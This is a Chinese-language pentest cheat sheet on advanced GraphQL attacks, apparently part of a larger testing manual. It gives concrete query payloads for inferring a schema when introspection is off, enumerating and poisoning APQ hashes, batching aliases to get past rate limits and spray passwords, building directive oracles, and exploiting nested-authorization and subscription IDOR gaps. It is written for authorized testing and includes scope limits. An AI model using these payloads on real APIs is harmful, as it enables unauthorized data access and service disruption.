# GraphQL 进阶攻击（超越基础内省）

> 补充 `graphql-test.md`（基础内省/批量/嵌套）的进阶面：内省关闭时的 schema 推断、APQ、别名放大、指令滥用、隐藏字段、嵌套授权缺口。

## 一、内省关闭时的 Schema 推断

```graphql
# 1. Field Suggestion Oracle（报错泄露字段名）
{ user { usernam } }
# error: "Cannot query field 'usernam' on type 'User'. Did you mean 'username'?"

# 2. __typename 探测（所有类型都有）
{ __typename }
# 返回对象类型名 → 摸清类型布局

# 3. __type 探测特定类型
{ __type(name: "User") { name fields { name } } }

# 4. 报错差分推断
{ user { id @(random) } }  # 不同 directive/参数报错泄露 schema 细节
```

## 二、APQ（持久化查询哈希）

```bash
# Apollo APQ：只发哈希查缓存
curl "https://t/graphql?extensions=%7B%22persistedQuery%22%3A%7B%22version%22%3A1%2C%22sha256Hash%22%3A%22<HASH>%22%7D%7D"
# PersistedQueryNotFound → 服务器没缓存；返回结果 → 哈希有效
```
- **哈希枚举**：固定查询名哈希可预测（如常见 introspection 哈希库）
- **APQ 缓存投毒**：发自定义查询注册恶意哈希 → 服务器缓存 → 他人用同一哈希（Apollo 版本相关）

## 三、别名放大（Alias）

```graphql
# 一次请求内批量（限流绕过核心）
{
  a: user(id: 1) { email }
  b: user(id: 2) { email }
  c: user(id: 3) { email }
  # …… 数百个别名：暴力枚举/限流绕过
}
```
- **枚举传参**：`p1..pN` 别名 + 字典参数一次跑完（登录接口密码喷洒/IDOR 批量）
- **DoS 面**：别名数量爆炸消耗服务端（配合查询复杂度审计）

## 四、指令滥用（@skip/@include）

```graphql
# 条件字段作为存在性 Oracle
{ user(id: 1) { email @include(if: true) } }
{ user(id: 1) { email @include(if: false) } }
# 响应差异 → 字段存在性盲探

# 自定义指令探测
{ user { id @internal } }  # 若报错说明有自定义指令空间
```

## 五、隐藏字段发现（内省外来源）

| 来源 | 方法 |
|------|------|
| JS bundle | `curl -s https://t/static/js/main.js \| grep -oE '"[a-z_]+(Query\|Mutation)"'` 提取操作名 |
| 移动端 App | jadx 反编译找 GraphQL 查询字符串（见移动端手册） |
| 历史/文档 | Wayback Machine 抓旧 bundle/文档 |
| 报错 | 未定义字段的 suggestion oracle（第一节） |
| 别名字段 | 已见字段的同类命名（`email`→`secondaryEmail`） |

## 六、嵌套授权缺口（重点）

- **对象级 vs 字段级鉴权**：顶层查询有鉴权，嵌套字段（`user { orders { ... } }`）可能无
- **深度差异**：直接查 `user(id)` 被拦，但 `viewer { friends { user(id) } }` 绕过
- **批量上下文**：数组参数里混入无权限 id（`users(ids:[1,2,3])` 部分越权）
- **协议差异**：REST 网关拦了，GraphQL 端点独立暴露未授权

## 七、突变与订阅

- **Mutation 面**：注册/改资料/发消息等写操作——重点测越权（改他人对象 id）
- **Subscription**：WebSocket 订阅实时数据——测订阅他人数据流（IDOR 实时版）
- 订阅鉴权常比查询弱（长连接建后不复查）

## 八、快速攻击速查

```
□ 内省开 → 直接 dump schema（graphql-test.md 流程）
□ 内省关 → suggestion/__typename/__type 推断
□ APQ → 哈希枚举/缓存投毒
□ 限流 → 别名批量绕过
□ 字段面 → 深度嵌套测授权缺口（对象/字段级）
□ 操作面 → Mutation 越权 + Subscription 数据流
□ 参数面 → filter/orderBy/limit 注入（sqlmap 工作流衔接）
□ DoS → 递归自引用/循环类型/fragment fan-out（低危，仅报告）
```

## 九、红线
- 别名枚举/喷洒控制节奏（避免触发业务风控/锁号）
- 订阅测试用自己账号数据流差分，不实际监听他人
- DoS 类只做小规模证明（不把 GraphQL 打挂）